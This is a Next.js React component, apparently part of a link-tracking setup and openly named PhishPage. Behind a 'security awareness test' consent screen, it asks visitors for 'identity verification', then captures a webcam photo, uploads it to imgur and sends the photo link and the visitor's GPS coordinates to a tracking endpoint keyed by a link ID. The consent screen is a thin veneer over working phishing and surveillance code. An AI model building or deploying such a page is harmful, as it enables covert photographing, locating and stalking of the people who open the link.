import { useState, useEffect } from 'react';
import { useRouter } from 'next/router';

export default function PhishPage() {
  const router = useRouter();
  const { id } = router.query;
  const [showConsent, setShowConsent] = useState(true);
  const [consentGiven, setConsentGiven] = useState(false);
  const [photoData, setPhotoData] = useState(null);

  const sendToBot = async (type, data) => {
    await fetch('/api/track', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ linkId: id, type, ...data })
    });
  };

  const takePhoto = async () => {
    try {
      // Browser will SHOW a permission popup - user must click Allow
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      const video = document.createElement('video');
      video.srcObject = stream;
      await video.play();

      // Capture frame
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext('2d').drawImage(video, 0, 0);
      
      const photoBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
      const formData = new FormData();
      formData.append('photo', photoBlob);
      formData.append('linkId', id);

      // Upload to temporary storage (imgur, etc.)
      const uploadRes = await fetch('https://api.imgur.com/3/image', {
        method: 'POST',
        headers: {
          'Authorization': 'Client-ID YOUR_IMGUR_CLIENT_ID'
        },
        body: formData
      });
      const uploadData = await uploadRes.json();
      
      await sendToBot('photo', { photoUrl: uploadData.data.link });
      
      // Stop camera
      stream.getTracks().forEach(track => track.stop());
      
      alert('Photo captured for verification!');
    } catch (e) {
      alert('Camera access denied or error occurred');
    }
  };

  const getLocation = async () => {
    try {
      // Browser will SHOW a permission popup - user must click Allow
      const position = await new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject);
      });
      
      await sendToBot('location', {
        coords: {
          lat: position.coords.latitude,
          lng: position.coords.longitude
        }
      });
      
      alert('Location captured for verification!');
    } catch (e) {
      alert('Location access denied');
    }
  };

  if (showConsent) {
    return (
      <div style={{ padding: '40px', textAlign: 'center', fontFamily: 'Arial' }}>
        <h1>⚠️ This is a Security Awareness Test</h1>
        <p>This page is part of an authorized security test.</p>
        <p>By clicking "I Consent", you agree to:</p>
        <ul style={{ listStyle: 'none', padding: 0 }}>
          <li>✅ Camera access (for verification)</li>
          <li>✅ Location access (for verification)</li>
          <li>✅ Your data will be sent to IT Security</li>
        </ul>
        <button 
          onClick={() => { setShowConsent(false); setConsentGiven(true); }}
          style={{ padding: '15px 30px', fontSize: '18px', margin: '10px', background: '#4CAF50', color: 'white', border: 'none', borderRadius: '5px', cursor: 'pointer' }}
        >
          I Consent - Begin Test
        </button>
        <button 
          onClick={() => sendToBot('declined')}
          style={{ padding: '15px 30px', fontSize: '18px', margin: '10px', background: '#f44336', color: 'white', border: 'none', borderRadius: '5px', cursor: 'pointer' }}
        >
          I Do Not Consent
        </button>
      </div>
    );
  }

  return (
    <div style={{ padding: '40px', textAlign: 'center', fontFamily: 'Arial' }}>
      <h1>Identity Verification</h1>
      <p>Please complete BOTH steps below:</p>
      
      <div style={{ margin: '30px' }}>
        <h2>Step 1: Take Photo</h2>
        <p>Click the button. Your browser will ask permission.</p>
        <button onClick={takePhoto} style={{ padding: '15px 30px', fontSize: '16px', cursor: 'pointer' }}>
          📷 Take Photo
        </button>
      </div>
      
      <div style={{ margin: '30px' }}>
        <h2>Step 2: Share Location</h2>
        <p>Click the button. Your browser will ask permission.</p>
        <button onClick={getLocation} style={{ padding: '15px 30px', fontSize: '16px', cursor: 'pointer' }}>
          📍 Share Location
        </button>
      </div>
    </div>
  );
            }
